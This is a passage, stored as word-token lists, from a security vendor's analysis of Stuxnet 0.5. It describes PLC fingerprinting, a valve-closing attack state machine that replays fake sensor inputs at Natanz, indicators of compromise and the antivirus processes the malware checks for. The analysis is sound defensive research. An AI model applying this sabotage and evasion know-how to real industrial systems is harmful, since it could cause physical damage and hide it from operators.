"W32.Stuxnet", "Dossier", ",", "Modifying", "PLCs", ")", "."], ["Stuxnet", "0.5", "hooks", "fewer", "exports", "and", "verifies", "the", "CPU", "is", "a", "417", "PLC", "rather", "than", "a", "315", "PLC", ",", "otherwise", "the", "behavior", "remains", "generally", "the", "same", "."], ["The", "second", "DLL", ",", "s7aaapix.dll", ",", "is", "used", "for", "fingerprinting", "the", "target", "system", "and", "building", "DB8061", ",", "a", "PLC", "data", "block", "needed", "to", "conduct", "the", "attack", "."], ["The", "export", "AUTDoVerb", "is", "hijacked", "and", "the", "malicious", "s7otbxdx.dll", "file", "can", "call", "the", "export", "with", "magic", "values", "(", "0x91E55A3D", ",", "0x996AB716", ",", "0x4A5CBB03", ")", "in", "order", "to", "build", "or", "provide", "a", "previously", "built", "DB8061", "data", "block", "for", "injection", "."], ["Stuxnet", "hijacks", "AUTDoVerb", "in", "order", "to", "monitor", "any", "\u201c", "DOWNLOAD", "\u201d", "verb", "actions", ",", "which", "signifies", "the", "fingerprinting", "and", "building", "of", "DB8061", "must", "occur", "again", "in", "order", "to", "ensure", "the", "target", "system", "is", "still", "correctly", "configured", "."], ["Page", "5", "Stuxnet", "0.5", ":", "The", "Missing", "Link", "Security", "Response", "Fingerprinting", "and", "building", "DB8061"], ["The", "building", "of", "the", "DB8061", "block", "is", "a", "complicated", "and", "lengthy", "process", "."], ["Table", "4", "Stuxnet", "0.5", "hooks", "fewer", "exports"], ["Stuxnet", "v0.500", "Stuxnet", "v1.xxx", "Through", "the", "hijacked", "export"], [",", "Stuxnet", "0.5", "will", "receive", "a", "pointer", "to", "the", "most", "recently", "used", "block", "(", "PLC", "programs", "consist", "of", "code", "and", "data", "blocks", ")", "."], ["Stuxnet", "0.5", "will", "then", "traverse", "the", "project", "structure", "in", "order", "to", "find", "the", "symbols", "used", "by", "the", "S7", "Program", "in", "the", "active", "project", "."], ["Symbols", "are", "human", "designated", "labels", "representing", "each", "device", "controlled", "by", "the", "PLC", "."], ["The", "symbol", "labels", "loosely", "follow", "the", "ANSI", "/", "ISA", "S5.1", "Instrumentation", "Symbols", "and", "Identification", "standard", "used", "in", "Piping", "and", "Instrumentation", "Diagrams"], ["(", "P&ID", ")", "."], ["s7_event", "Stuxnet", "0.5", "uses", "these", "labels", "for", "both", "fingerprinting", "and", "determining", "the", "addresses", "of", "each", "device", "in", "order", "to", "modify", "the", "behavior", "of", "those", "devices", "."], ["s7_event", "s7ag_bub_cycl_read_create", "s7ag_bub_read_var", "s7ag_bub_read_var_seg", "s7ag_bub_write_var"], ["s7ag_bub_write_var_seg", "s7ag_link_in", "s7ag_read_szl", "s7ag_read_szl", "s7ag_test", "s7ag_test", "s7blk_delete", "s7blk_delete", "s7blk_findfirst", "s7blk_findfirst", "s7blk_findnext", "s7blk_findnext", "Symbol", "label", "parsing", "s7blk_read", "s7blk_read", "The", "target", "system", "must", "be", "a", "SIMATIC", "400", "Station", "(", "0x14109A", ")", "or", "SIMATIC", "H", "-", "Station", "(", "0x141342", ")", ",", "which", "use", "417", "PLCs", "."], ["The", "symbol", "labels", "must", "match", "the", "format", ":", "s7blk_write", "s7blk_write", "s7db_close", "s7db_open", "s7db_open", "<", "delimiter><FunctionIdentifier><delimiter><C"], ["ascadeModule><delimiter><CascadeNumber><Dev", "iceNumber", ">"], ["A", "valve", "in", "module", "A21", ",", "also", "in", "cascade", "8", ",", "and", "associated", "with", "centrifuge", "160", ",", "would", "have", "the", "symbol", "label", "PVA21", "-", "8", "-", "160", ",", "for", "example", "."], ["Each", "field", "is", "defined", "as", "follows", ":", "Delimiter"], ["Either", "space", "(", "\u201c", "\u201c", ")", ",", "hyphen", "(", "\u201c", "-", "\u201d", ")", ",", "underscore", "(", "\u201c", "_", "\u201d", ")", ",", "or", "not", "present", "at", "all", "."], ["FunctionIdentifer"], ["A", "string", "that", "matches", "a", "set", "of", "strings", "(", "available", "in", "Appendix", "C", ")", "that", "loosely", "follows", "the", "ANSI", "/", "ISA", "S5.1", "Instrumentation", "Symbols", "and", "Identification", "standard", "."], ["If", "the", "string", "is", "\u201c", "PIA", "\u201d", "(", "Pressure", "Indicator", "Alarm", ")", ",", "it", "is", "expected", "to", "be", "followed", "by", "a", "one", "digit", "number", "."], ["These", "strings", "will", "represent", "the", "device", "type", "(", "a", "valve", ",", "a", "transducer", ",", "or", "a", "status", "light", ",", "for", "instance", ")", "."], ["CascadeModule"], ["Must", "be", "the", "string", "\u201c", "A21", "\u201d", "to", "\u201c", "A28", "\u201d", "inclusive", "."], ["These", "strings", "match", "cascade", "modules", "in", "Natanz", ",", "Iran", ",", "seen", "publicly", "described", "as", "\u201c", "A24", "\u201d", ",", "\u201c", "A26", "\u201d", ",", "and", "\u201c", "A28", "\u201d", "."], ["CascadeNumber"], ["Single", "character", "that", "is", "in", "the", "letter", "range", "A", "to", "R.", "If", "it", "is", "not", "in", "this", "letter", "range", ",", "it", "checks", "to", "see", "if", "it", "is", "two", "digits", "in", "the", "decimal", "range", "00", "to", "18", "."], ["This", "two", "digit", "number", "is", "the", "number", "representation", "of", "the", "letter", "for", "A", "to", "R.", "Page", "6", "Stuxnet", "0.5", ":", "The", "Missing", "Link", "Security", "Response", "DeviceNumber"], ["This", "is", "parsed", "in", "a", "more", "complex", "fashion", "depending", "on", "the", "device", "type", "as", "determined", "by", "the", "function", "identifier", "and", "caters", "to", "three", "possible", "cascade", "arrangements", "."], ["The", "device", "type", "mappings", "to", "function", "identifiers", "are", "available", "in", "Appendix", "C.", "Device", "type", "0"], ["A", "string", "of", "digits", ":", "If", "the", "length", "of", "the", "digits", "is", "less", "than", "three", ",", "the", "device", "type", "is", "changed", "to", "device", "type", "6", "."], ["If", "the", "length", "of", "the", "digits", "is", "greater", "than", "or", "equal", "to", "three", ",", "the", "device", "type", "is", "changed", "to", "device", "type", "7", "."], ["Device", "type", "1", ",", "2", ",", "3", "\u201c", "#", "#", "\u201d", ":", "A", "two", "digit", "number", "in", "the", "range", "1", "to", "25", "."], ["Device", "type", "4", ",", "5", ",", "or", "7", "Device", "type", "4", ",", "5", ",", "or", "7", "has", "three", "different", "formats", ":", "Format", "1", "\u201c", "#", "#", "#", "#", "\u201d", ":", "Decoded", "as", "two", "separate", "two", "-", "digit", "numbers", "representing", "the", "stage", "number", "and", "the", "centrifuge", "number", "within", "the", "stage", ",", "respectively", "."], ["The", "stage", "number", "must", "be", "in", "the", "decimal", "range", "1", "to", "15", ",", "which", "matches", "with", "the", "known", "Natanz", "configuration", "."], ["For", "each", "of", "these", "15", "stages", ",", "the", "maximum", "number", "of", "expected", "centrifuges", "in", "each", "corresponding", "stage", "is", "looked", "up", "in", "the", "following", "array", "."], ["Table", "5", "Stage", "numbers", "with", "expected", "numbers", "of", "centrifuges"], ["Stage", "Max", "#", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "2", "2", "4", "6", "8", "10", "12", "16", "20", "24", "20", "16", "12", "8", "4"], ["This", "means", ",", "for", "example", ",", "stage", "3", "is", "expected", "to", "have", "a", "second", "two", "digit", "number", "equal", "to", "4", "or", "less", "."], ["This", "requirement", "is", "consistent", "with", "the", "centrifuge", "arrangement", "within", "a", "cascade", "."], ["Format", "2", "\u201c", "#", "#", "#", "\u201d", ":", "A", "three", "digit", "number", "that", "must", "be", "less", "than", "164", ",", "which", "is", "the", "number", "of", "centrifuges", "in", "a", "cascade", "."], ["Format", "3", "\u201c", "#", "#", "L", "\u201d", ":", "A", "two", "digit", "number", "followed", "by", "a", "letter", "."], ["The", "letter", "must", "be", "in", "the", "range", "A", "to", "D", ",", "and", "the", "number", "must", "be", "in", "the", "decimal", "range", "1", "to", "43", "."], ["This", "arrangement", "sub", "-", "divides", "each", "stage", "into", "sub", "-", "clusters", "of", "four", "."], ["Device", "type", "6", "\u201c", "#", "#", "\u201d", ":", "A", "two", "digit", "number", "in", "the", "range", "1", "to", "30", "."], ["Device", "type", "8", ",", "9", ",", "B", ",", "or", "C", "\u201c", "#", "#", "\u201d", ":", "A", "two", "digit", "number", "in", "the", "range", "1", "to", "3", "."], ["Page", "7", "Stuxnet", "0.5", ":", "The", "Missing", "Link", "Security", "Response"], ["Device", "type", "A", "\u201c", "#", "#", "<", "delimiter><string", ">", "\u201d", ":", "A", "two", "digit", "number", "in", "the", "range", "1", "to", "3", "with", "an", "optional", "string", "preceded", "by", "a", "delimiter", "character", "."], ["The", "string", "must", "start", "with", "the", "letter", "S", "and", "contain", "the", "letter", "P."], ["If", "the", "string", "is", "present", ",", "the", "device", "is", "modified", "to", "be", "device", "type", "0xB", "instead", "(", "Flow", "Rate", "Transmitter", "Controller", "Output", ",", "rather", "than", "device", "type", "0xA", "which", "is", "Flow", "Rate", "Transmitter", "Controller", "Input", ")", "."], ["Based", "on", "the", "symbol", "fingerprinting", ",", "the", "following", "table", "summarizes", "what", "devices", "and", "labels", "Stuxnet", "looks", "for", "within", "the", "symbol", "table", "."], ["Table", "6", "Summary", "of", "Stuxnet", "symbol", "label", "parsing", "Device", "type", "P&ID", "function", "identifier", "Auxiliary", "valve", "{", "HS", ",", "HV", ",", "PV", ",", "EP", "}", ",", "{", "ZLO", ",", "ZO},{ZLC", ",", "ZC", "}", "Centrifuge", "valve", "{", "MVS", ",", "RVS", ",", "VS", "}", ",", "{", "MV", ",", "RV", ",", "SV", ",", "YV", "}", "Stage", "pressure", "transducer", "Devices", "per", "cascade"], ["Min", "Max", "2", "25", "163", "164", "PT", ",", "PCV", ",", "PIA", "#", ",", "PIT", ",", "PIC", ",", "PI", ",", "PS", "3", "30", "Centrifuge", "pressure", "transducer", "PT", ",", "PCV", ",", "PIA", "#", ",", "PIT", ",", "PIC", ",", "PI", ",", "PS", "0", "164"], ["Flow", "rate", "sensor", "{", "FIA", "}", ",", "{", "FIT", "}", ",", "{", "FITC},FIC", ",", "FT", ",", "MFC", ",", "MFM", "}", "0", "3", "Symbol", "address", "parsing"], ["Each", "symbol", "label", "will", "have", "two", "corresponding", "addresses", ":", "--", "the", "address", "in", "the", "process", "image", "area", "and", "the", "direct", "peripheral", "address", "of", "the", "device", "represented", "by", "the", "symbol", "."], ["Modifying", "the", "memory", "at", "these", "addresses", "allows", "the", "PLC", "to", "control", "and", "read", "the", "behavior", "of", "the", "associated", "device", "."], ["For", "example", ",", "the", "value", "may", "be", "a", "Boolean", "value", "turning", "a", "switch", "on", "or", "off", ",", "or", "a", "16", "-", "bit", "value", "representing", "the", "current", "temperature", "of", "the", "system", "."], ["Addresses", "can", "be", "either", "outputs", "(", "the", "PLC", "sets", "the", "value", "to", "modify", "the", "behavior", "of", "the", "device", ")", "or", "inputs", "(", "the", "PLC", "reads", "the", "value", "to", "determine", "the", "current", "state", "of", "the", "device", ")", "."], ["Device", "types", "0", ",", "1", ",", "5", ",", "and", "B", "must", "be", "output", "addresses", "and", "device", "types", "2", ",", "3", ",", "4", ",", "5", ",", "6", ",", "7", ",", "8", ",", "9", ",", "A", ",", "and", "C", "must", "be", "input", "addresses", "."], ["Values", "at", "addresses", "for", "device", "types", "0", ",", "1", ",", "2", ",", "3", ",", "4", ",", "and", "5", "must", "be", "bit", "values", "."], ["Values", "at", "addresses", "for", "device", "types", "6", ",", "7", ",", "8", ",", "9", ",", "A", ",", "B", ",", "and", "C", "must", "be", "16", "-", "bit", "values", "."], ["Cascade", "rating", "and", "building", "DB8061"], ["After", "parsing", "the", "symbols", "and", "addresses", "for", "each", "cascade", ",", "the", "code", "inspects", "the", "configuration", "of", "each", "cascade", "."], ["Depending", "on", "the", "configuration", ",", "a", "rating", "is", "calculated", "."], ["Certain", "devices", "in", "certain", "configurations", "will", "result", "in", "higher", "ratings", "."], ["When", "complete", ",", "only", "the", "six", "highest", "-", "rated", "cascades", "have", "data", "written", "to", "DB8061", "."], ["Finally", ",", "a", "flag", "is", "set", "signifying", "DB8061", "has", "been", "built", "."], ["This", "flag", "is", "reset", "to", "0", "every", "time", "the", "\u201c", "DOWNLOAD", "\u201d", "verb", "is", "executed", "."], ["Page", "8", "Stuxnet", "0.5", ":", "The", "Missing", "Link", "Security", "Response", "PLC", "device", "attack", "code"], ["The", "code", "conducts", "an", "attack", "by", "closing", "valves", "in", "the", "six", "top", "rated", "cascades", "out", "of", "the", "possible", "18", "cascades", "."], ["The", "states", "of", "two", "types", "of", "valves", "are", "modified", ":", "\u2022", "Centrifuge", "valves", "\u2013", "a", "set", "of", "three", "valves", "(", "feed", ",", "product", ",", "tails", ")", "that", "work", "in", "unison", "per", "centrifuge", "to", "control", "uranium", "hexafluoride", "(", "UF6", ")", "flow", "into", "each", "centrifugeStage", "valves", "\u2013", "one", "per", "stage", "to", "control", "UF6", "flow", "into", "each", "stage", "\u2022"], ["Auxiliary", "valves", "\u2013", "valves", "that", "control", "UF6", "flow", "into", "or", "out", "of", "each", "stage", "(", "stage", "valve", ")", "or", "the", "cascade", "as", "a", "whole"], ["Figure", "2", "Example", "valve", "configuration", "showing", "both", "valve", "types", "in", "three", "stages", "of", "a", "cascade", "Similar", "to", "version", "1.x", "of", "Stuxnet", ",", "the", "PLC", "device", "attack", "code", "consists", "of", "a", "state", "machine", "with", "eight", "possible", "states", ":", "State", "0"], ["(", "Wait", "):", "Perform", "system", "identification", "and", "wait", "for", "the", "enrichment", "process", "to", "reach", "steady", "state", "before", "attack", "."], ["This", "can", "take", "approximately", "30", "days", "."], ["State", "1", "(", "Record", "):", "Take", "peripheral", "snapshots", "and", "build", "fake", "input", "blocks", "for", "replaying", "later", "."], ["State", "2", "(", "Attack", "centrifuge", "valves", "):", "Begin", "replaying", "fake", "input", "signals", "."], ["Close", "valves", "on", "most", "centrifuges", "."], ["State", "3", "(", "Secondary", "pressure", "reading", "):", "Open", "both", "centrifuge", "and", "feed", "stage", "valves", "in", "the", "final", "stage", "of", "a", "single", "cascade", "to", "obtain", "a", "low", "pressure", "reading", "."], ["Page", "9", "Stuxnet", "0.5", ":", "The", "Missing", "Link", "Security", "Response", "State", "4", "(", "Wait", "for", "pressure", "change", "):", "Wait", "for", "desired", "pressure", "change", "or", "time", "limit", "."], ["This", "can", "take", "up", "to", "approximately", "two", "hours", "."], ["State", "5", "(", "Attack", "auxiliary", "valves", "):", "Open", "all", "auxiliary", "valves", "except", "valves", "believed", "to", "be", "near", "the", "first", "feed", "stage", "(", "stage", "10", ")", "."], ["Wait", "for", "three", "minutes", "in", "this", "state", "."], ["State", "6", "(", "Wait", "for", "attack", "completion", "):", "Wait", "for", "six", "minutes", "while", "preventing", "any", "state", "changes", "."], ["State", "7", "(", "Finish", "):", "Reset", "and", "return", "to", "state", "zero", "."], ["Figure", "3", "State", "flow", "diagram", "of", "417", "PLC", "device", "attack", "code", "State", "0", ":"], ["The", "code", "verifies", "the", "system", "has", "reached", "steady", "state", "by", "monitoring", "the", "state", "of", "each", "auxiliary", "valve", "and", "the", "amount", "of", "elapsed", "time", "."], ["\u2022"], ["The", "valves", "must", "not", "change", "state", "for", "a", "period", "of", "300", "snapshots", "."], ["In", "addition", ",", "the", "code", "determines", "if", "most", "of", "the", "centrifuge", "valves", "are", "in", "the", "open", "or", "closed", "position", "."], ["\u2022"], ["All", "cascades", "must", "be", "operational", "for", "three", "or", "more", "days", ",", "or", "currently", "be", "in", "the", "down", "state", "."], ["\u2022", "At", "least", "one", "cascade", "must", "have", "been", "operating", "for", "more", "than", "35", "days", ",", "or", "collectively", "all", "cascades", "must", "have", "been", "operating", "for", "more", "than", "297", "days", "."], ["\u2022", "Between", "3", "and", "7", "of", "the", "first", "21", "auxiliary", "valves", "must", "have", "been", "opened", "in", "the", "last", "2", "days", "."], ["Page", "10", "Stuxnet", "0.5"], [":", "The", "Missing", "Link", "Security", "Response", "\u2022"], ["Most", "of", "the", "pressure", "readings", "associated", "with", "the", "auxiliary", "valves", "must", "be", "within", "an", "expected", "range", "."], ["Only", "if", "these", "all", "conditions", "are", "met", "does", "the", "code", "proceed", "to", "state", "1", "."], ["State", "1", ":"], ["There", "are", "21", "snapshots", "of", "the", "peripheral", "I", "/", "O", "values", "that", "are", "taken", "one", "second", "apart", "."], ["These", "values", "are", "stored", "for", "replay", "during", "the", "attack", "."], ["This", "prevents", "systems", "and", "technicians", "from", "realizing", "the", "system", "is", "no", "longer", "operating", "as", "expected", "."], ["State", "2", ":"], ["First", ",", "the", "normal", "operating", "pressure", "is", "obtained", "and", "stored", "for", "replay", "later", "."], ["For", "each", "stage", "a", "portion", "of", "all", "the", "centrifuge", "valves", "are", "closed", ",", "except", "in", "the", "feed", "stage", "(", "stage", "10", ")", "."], ["The", "centrifuge", "valves", "in", "the", "feed", "stage", "remain", "completely", "open", ",", "while", "the", "centrifuge", "valves", "at", "both", "the", "product", "end", "and", "tails", "end", "are", "completely", "closed", "."], ["The", "particular", "centrifuge", "valves", "closed", "per", "stage", "are", "randomly", "chosen", "."], ["The", "code", "will", "randomly", "chose", "a", "starting", "centrifuge", "valve", "and", "then", "close", "the", "next", "one", "in", "order", "until", "the", "last", "centrifuge", "valve", "in", "the", "stage", "."], ["If", "the", "total", "desired", "number", "of", "valves", "to", "close", "for", "that", "stage", "has", "not", "been", "reached", ",", "the", "code", "will", "continue", "from", "the", "first", "centrifuge", "valve", "in", "the", "stage", "until", "the", "maximum", "valves", "to", "close", "are", "reached", "."], ["Table", "7", "Processing", "stages", "and", "valves", "states", "Stage", "Centrifuges", "Centrifuge", "valves", "to", "close", "Percentage", "closed", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "2", "2", "4", "6", "8", "10", "12", "16", "20", "24", "20", "16", "12", "8", "4", "2", "2", "2", "4", "6", "8", "10", "13", "14", "0", "14", "13", "10", "8", "4", "100", "%", "100", "%", "50", "%", "67", "%", "75", "%", "80", "%", "83", "%", "81", "%", "70", "%", "0", "%", "70", "%", "81", "%", "83", "%", "100", "%", "100", "%", "State", "3", ":"], ["In", "state", "3", ",", "in", "a", "single", "cascade", ",", "both", "centrifuge", "valves", "in", "stage", "1", "are", "opened", "and", "it", "is", "likely", "the", "stage", "valve", "of", "stage", "1", "is", "also", "opened", "."], ["Then", ",", "the", "code", "obtains", "a", "pressure", "reading", "at", "stage", "1", "."], ["The", "pressure", "should", "be", "relatively", "low", "."], ["This", "value", "is", "used", "for", "replay", "in", "later", "stages", "."], ["If", "the", "normal", "pressure", "operating", "pressure", "was", "n\u2019t", "obtained", "properly", "in", "state", "2", ",", "state", "3", "is", "actually", "skipped", "and", "hardcoded", "default", "values", "are", "used", "instead", "."], ["State", "4", ":", "State", "4", "waits", "for", "the", "desired", "pressure", "change", "or", "other", "predetermined", "time", "limits", "before", "proceeding", "to", "state", "5", "."], ["If", "any", "of", "the", "following", "conditions", "are", "met", ",", "the", "code", "will", "continue", "to", "state", "5", ":", "\u2022"], ["The", "pressure", "of", "the", "stage", "10", "or", "stage", "11", "transducer", "(", "these", "are", "likely", "transducers", "for", "or", "near", "the", "feed", "stage", ")", "has", "an", "absolute", "value", "greater", "than", "280", "units", "above", "the", "expected", "value", "and", "greater", "than", "five", "times", "the", "expected", "value", "."], ["\u2022", "46", "minutes", "after", "the", "state", "of", "an", "auxiliary", "valve", "has", "been", "modified", "from", "the", "original", "state", "recorded", "in", "state", "1", ",", "with", "the", "exception", "of", "auxiliary", "valve", "number", "17", "which", "is", "likely", "a", "stage", "valve", "near", "the", "product", "end", "."], ["\u2022", "2", "hours", "and", "3", "minutes", "after", "the", "attack", "started", "(", "since", "state", "2", ")", "without", "any", "centrifuge", "valve", "state", "changes", "."], ["\u2022", "2", "hours", "and", "3", "minutes", "since", "at", "least", "four", "centrifuge", "valve", "states", "have", "been", "modified", "from", "the", "original", "state", "recorded", "in", "state", "1", "."], ["State", "5", ":"], ["In", "state", "5", ",", "all", "the", "auxiliary", "valves", "are", "opened", "except", "valve", "numbers", "17", ",", "18", ",", "and", "20", "."], ["Before", "continuing", "to", "state", "6", ",", "the", "Page", "11", "Stuxnet", "0.5", ":", "The", "Missing", "Link", "Security", "Response", "code", "waits", "for", "at", "least", "2", "minutes", "and", "53", "seconds", "."], ["State", "6", ":"], ["During", "state", "6", ",", "fake", "values", "continue", "to", "be", "replayed", "and", "any", "attempts", "to", "change", "device", "values", "are", "prevented", "for", "6", "minutes", "and", "58", "seconds", "."], ["State", "7", ":"], ["Data", "is", "reset", "and", "the", "code", "returns", "to", "state", "0", "."], ["By", "closing", "all", "valves", "except", "the", "initial", "feed", "stage", "valves", ",", "UF6", "will", "continue", "to", "flow", "into", "the", "system", "."], ["This", "act", "alone", "may", "cause", "damage", "to", "the", "centrifuges", "themselves", "."], ["However", ",", "the", "attack", "expects", "the", "pressure", "to", "reach", "five", "times", "the", "normal", "operating", "pressure", "."], ["At", "this", "pressure", ",", "significant", "damage", "to", "the", "uranium", "enrichment", "system", "could", "occur", "and", "the", "UF6", "gas", "could", "even", "revert", "to", "a", "solid", "."], ["Whether", "the", "attack", "succeeded", "in", "this", "manner", "or", "not", "remains", "unclear", "."], ["Even", "if", "the", "attack", "did", "succeed", ",", "the", "attackers", "decided", "to", "move", "to", "a", "different", "strategy", "in", "the", "Stuxnet", "1.x", "versions", ",", "attacking", "the", "speed", "of", "the", "centrifuges", "instead", "."], ["Conclusion", "Stuxnet", "0.5", "clarifies", "the", "evolution", "and", "history", "of", "Stuxnet", "."], ["Stuxnet", "clearly", "became", "more", "aggressive", "over", "time", "and", "switched", "development", "platforms", "as", "it", "evolved", "from", "0.5", "versions", "to", "later", "1.x", "versions", "."], ["Key", "parts", "of", "the", "417", "attack", "code", "missing", "from", "versions", "1.x", "is", "fully", "implemented", "in", "Stuxnet", "0.5", "."], ["This", "demonstrates", "that", "the", "417", "attack", "code", "was", "the", "first", "attack", "strategy", "implemented", "by", "Stuxnet", "."], ["This", "original", "417", "attack", "code", "attempted", "to", "modify", "valve", "states", "during", "the", "uranium", "enrichment", "process", "at", "Natanz", ",", "Iran", ",", "to", "cause", "damage", "to", "the", "centrifuges", "and", "the", "system", "as", "a", "whole", "."], ["Figure", "4", "Low", "-", "enriched", "uranium", "production", "(", "source", "ISIS", ")"], ["The", "success", "of", "Stuxnet", "0.5", "remains", "unknown", "."], ["However", ",", "the", "chart", "in", "figure", "4", "references", "uranium", "enrichment", "production", "at", "Natanz", "to", "key", "milestones", "of", "Stuxnet", "development", "."], ["Interesting", "events", "are", "dips", "in", "feed", "or", "production", "amounts", "and", "lower", "levels", "of", "production", "given", "the", "same", "or", "greater", "feed", "amounts", "(", "shown", "as", "gaps", "between", "the", "two", "lines", ")", "."], ["While", "the", "discovery", "of", "Stuxnet", "0.5", "helps", "to", "deepen", "our", "overall", "understanding", "of", "Stuxnet", "and", "what", "its", "goals", "are", ",", "versions", "remain", "unrecovered", "."], ["If", "these", "are", "located", ",", "they", "may", "expose", "other", "secrets", "behind", "this", "operation", "and", "more", "clues", "to", "its", "origins", ",", "but", "obtaining", "these", "other", "samples", "may", "prove", "to", "be", "next", "to", "impossible", "."], ["Page", "12"], ["Stuxnet", "0.5", ":", "The", "Missing", "Link", "Security", "Response", "Appendix", "A"], ["The", "following", "registry", "entries", "are", "indicators", "of", "compromise", ":", "\u2022", "HKEY", "_", "LOCAL", "_", "MACHINE\\SYSTEM\\CurrentControlSet\\Services\\MRxCls", "\u2022"], ["HKEY", "_", "LOCAL", "_", "MACHINE\\SYSTEM\\CurrentControlSet\\Services\\usbacc11"], ["\u2022"], ["HKEY", "_", "USERS\\<SID>\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\", "ShellRecoveryState"], ["The", "following", "files", "are", "indicators", "of", "compromise", ":", "\u2022", "\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022", "\u2022"], ["\u2022", "\u2022", "%", "WinDir%\\inf\\mdmcpq3.PNF", "\u2013", "Encrypted", "installation.dll", "%", "WinDir%\\inf\\mdmeric3.PNF", "\u2013", "P2P", "configuration", "file", "%", "WinDir%\\inf\\oem6C.PNF", "\u2013", "Log", "file", "%", "WinDir%\\inf\\oem7A.PNF", "\u2013", "Main", "Stuxnet", "component", "(", "outbreak.dll", ")", "%", "WinDir%\\inf\\oem7F.pnf", "%", "WinDir%\\inf\\oem7w.pnf", "\u2013", "Encrypted", "installation.dll", "%", "WinDir%\\inf\\~67.tmp", "\u2013", "Encrypted", "installation.dll", "%", "System%\\drivers\\mrxcls.sys", "\u2013", "Load", "point", "driver", "%", "System%\\drivers\\usbacc11.sys", "\u2013", "Load", "point", "driver", "for", "C&C", "server", "modules", "%", "System%\\drivers\\PCIBUS.SYS", "\u2013", "Timer", "driver", "for", "generating", "BSoD", "%", "System%\\comuid.dat", "%", "System%\\netsimp32.dll", "\u2013", "P2P", "communication", "%", "System%\\inetpsp.dll", "\u2013", "C&C", "server", "communication", "%", "System%\\perfg009.dat", "%"], ["WinDir%\\msagent\\agentsb.dll", "%"], ["WinDir%\\msagent\\intl\\agt0f2e.dll", "%", "System%\\complnd.dll", "%", "System%\\dllcache\\datacprs.dll", "%", "System%\\wbem\\perfnws.dll", "%"], ["WinDir%\\Installer\\{6F716D8C-398F-11D3", "-", "85E1", "-", "005004838609}\\places.dat"], ["%", "System%\\dssbase.dat", "\u2013", "Log", "file", "%", "AllUsersProfile%\\Application", "Data\\Microsoft\\HTML", "Help\\hhorcslt.dat", "%", "Temp%/DF419a.tmp", "%", "WinDir%\\help\\winmic.fts", "\u2013", "Configuration", "file", "for", "Step", "7", "infections", "Page", "13"], ["Stuxnet"], ["0.5"], [":"], ["The", "Missing", "Link", "Security", "Response", "Appendix", "B", "Processes", "checked", "for", "and", "the", "assumed", "security", "product", "associated", "with", "the", "process", ":", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "umxagent", ",", "Tiny", "Personal", "Firewall", "cfgintpr", ",", "Tiny", "Personal", "Firewall", "umxldra", ",", "Tiny", "Personal", "Firewall", "amon", ",", "Tiny", "Activity", "Monitor"], ["UmxCfg", ",", "Tiny", "Personal", "Firewall"], ["UmxPol", ",", "Tiny", "Personal", "Firewall", "UmxTray", ",", "Tiny", "Personal", "Firewall", "vsmon", ",", "ZoneAlarm", "Personal", "Firewall", "zapro", ",", "ZoneAlarm", "Personal", "Firewall", "zlclient", ",", "ZoneAlarm", "Personal", "Firewall", "tds-3,TDS3", "Trojan", "Defense", "Suite", "avp", ",", "Kaspersky", "avpcc", ",", "Kaspersky", "avpm", ",", "Kaspersky", "kavpf", ",", "Kaspersky", "kavi", ",", "Kaspersky", "safensec", ",", "SafenSoft", "snsmcon", ",", "SafenSoft", "filemon", ",", "Sysinternals", "Filemon", "regmon", ",", "Sysinternals", "Filemon"], ["FrameworkService", ",", "McAfee", "UpdaterUI", ",", "McAfee", "shstat", ",", "McAfee", "naPrdMgr", ",", "McAfee", "rapapp.exe", ",", "Blackice", "Firewall", "blackice.exe", ",", "Blackice", "Firewall", "blackd.exe", ",", "Blackice", "Firewall", "rcfgsvc.exe", "pfwcfgsurrogate.exe", ",", "Tiny", "Personal", "Firewall", "pfwadmin.exe", ",", "Tiny", "Personal", "Firewall", "persfw.exe", ",", "Kerio", "Personal", "Firewall", "agentw.exe", ",", "Kerio", "Personal", "Firewall", "agenta.exe", ",", "Kerio", "Personal", "Firewall", "msascui.exe", ",", "Windows", "Defender", "msmpeng.exe", ",", "Windows", "Defender", "fssm32.exe", ",", "F", "-", "Secure", "fsgk32st.exe", ",", "F", "-", "Secure", "fsdfwd.exe", ",", "F", "-", "Secure", "fsaw.exe", ",", "F", "-", "Secure", "fsavgui.exe", ",", "F", "-", "Secure", "fsav32.exe", ",", "F", "-", "Secure", "fsav.exe", ",", "F", "-", "Secure", "fsma32.exe", ",", "F", "-", "Secure", "fsm32.exe", ",", "F", "-", "Secure"], ["fsgk32.exe", ",", "F", "-", "Secure", "Page", "14", "Stuxnet", "0.5", ":", "The", "Missing", "Link", "Security", "Response", "Appendix", "C", "Table", "of", "each", "allowed", "function", "identifier", ",", "the", "corresponding", "device", "type", ",", "and", "the", "assumed", "device", "name", "."], ["Table", "8", "Function", "identifiers", ",", "device", "types", ",", "and", "assumed", "device", "name"], ["Function", "identifier", "Device", "type", "Device", "name", "PT", "0", "Pressure", "Transmitter"], ["PCV", "0", "Pressure", "Control", "Valve", "PIA", "0"], ["Pressure", "Indicator", "Alarm", "PIT", "0", "Pressure", "Indicator", "Transmitter", "PIC", "0", "Pressure", "Indicator", "Controller", "PI", "0"], ["Pressure", "Indicator", "PS", "0"], ["Pressure", "Switch", "HS", "1", "Hand", "Switch", "HV", "1", "Hand", "Valve", "PV", "1", "Pressure", "Valve", "EP", "1", "Voltage", "(", "Test", ")", "Point"], ["ZLO", "2", "Light", "Position", "Open"], ["(", "Status", "light", ")"], ["ZO", "2", "Position", "Open", "ZLC", "3", "Light", "Position", "Closed", "ZC", "3", "Position", "Closed", "MVS", "4"], ["Manual", "Valve", "Switch", "RVS", "4"], ["Relief", "Valve", "Switch", "VS", "4", "Valve", "Switch"], ["SHS", "4", "High", "Frequency", "Switch", "MV", 